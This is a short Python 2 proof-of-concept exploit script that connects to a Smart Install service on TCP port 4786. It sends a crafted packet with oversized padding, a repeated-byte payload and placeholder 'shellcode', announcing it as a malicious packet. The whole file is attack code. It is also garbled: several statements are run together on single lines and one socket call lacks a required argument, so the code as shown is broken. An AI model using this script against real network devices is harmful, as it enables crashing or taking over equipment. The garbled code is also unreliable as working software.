# smi_attack.py

import socket 
import struct 
from optparse import OptionParser 

# Parse the target options 
parser = OptionParser() 
parser.add_option("-t", "--target", dest="target", help="Smart Install Client", default="192.168.1.1")  parser.add_option("-p", "--port", dest="port", type="int", help="Port of Client", default=4786)  (options, args) = parser.parse_args() 

def craft_tlv(t, v, t_fmt='!I', l_fmt='!I'): 
    return struct.pack(t_fmt, t) + struct.pack(l_fmt, len(v)) + v 

def send_packet(sock, packet): 
    sock.send(packet)   

def receive(sock):  
    return sock.recv() 

if __name__ == "__main__": 

    print "[*] Connecting to Smart Install Client ", options.target, "port", options.port 

    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    con.connect((options.target, options.port)) 

    payload = 'BBBB' * 44  shellcode = 'D' * 2048 

    data = 'A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payload 

    tlv_1 = craft_tlv(0x00000001, data)  tlv_2 = shellcode 

    hdr =  '\x00\x00\x00\x01'                                   # msg_from
    hdr += '\x00\x00\x00\x01'                                   # version
    hdr += '\x00\x00\x00\x07'                                   # msg_hdr_type
    hdr += struct.pack('>I', len(data))                         # data_length

    pkt = hdr + tlv_1 + tlv_2 

    print "[*] Send a malicious packet"  
    send_packet(con, pkt)